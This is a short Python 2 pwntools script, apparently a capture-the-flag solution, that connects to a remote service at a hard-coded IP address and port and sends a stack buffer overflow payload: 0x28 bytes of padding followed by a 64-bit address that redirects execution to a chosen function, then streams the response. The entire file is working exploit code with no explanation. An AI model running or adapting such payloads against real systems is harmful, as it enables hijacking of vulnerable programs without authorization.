#!/usr/bin/env python2

from pwn import *

r = remote('139.59.30.165', 8700)

r.sendline('a'*0x28 + p64(0x400766))
r.stream()
